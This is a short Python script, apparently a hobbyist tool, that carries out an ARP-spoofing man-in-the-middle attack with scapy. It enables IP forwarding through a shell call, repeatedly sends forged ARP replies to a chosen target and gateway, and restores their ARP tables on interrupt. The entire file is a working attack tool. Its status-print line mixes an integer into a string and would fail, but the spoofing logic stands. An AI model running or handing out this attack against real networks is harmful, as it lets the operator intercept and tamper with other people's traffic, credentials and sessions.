import scapy.all as scapy
import subprocess as sub
import time
import optparse as opt

sub.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
time.sleep(1)
print("Coding By Berk Küçük")
def user_input():
    parser=opt.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="Enter target ip, use --help for more info.")
    parser.add_option("-g","--gateway",dest="gateway_ip",help="Enter gateway ip, use --help for more info.")
    options=parser.parse_args()[0]
    if not options.target_ip:
        print("Enter target ip...")
    if not options.gateway_ip:
        print("Enter gateway ip...")
    return options
def get_mac(ip):

    arp_request=scapy.ARP(pdst=ip)
    broadcast_request=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_request=broadcast_request/arp_request
    answered_list=scapy.srp((combined_request),timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):
    target_mac=get_mac(target_ip)
    arp_response=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

def delete_poisoning(fooled_ip,gateway_ip):
    fooled_mac=get_mac(fooled_ip)
    gateway_mac=get_mac(gateway_ip)
    arp_response=scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=5)

user_ips=user_input()
user_target_ip=user_ips.target_ip
user_gateway_ip=user_ips.gateway_ip
num=0
try:
    while True:
        num+=2
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        time.sleep(1)
        print("\rSending packets..."+num,end="")
except KeyboardInterrupt:
    print("\nMITM Attack Stoped and Resseted")
    delete_poisoning(user_target_ip,user_gateway_ip)
    delete_poisoning(user_gateway_ip,user_target_ip)
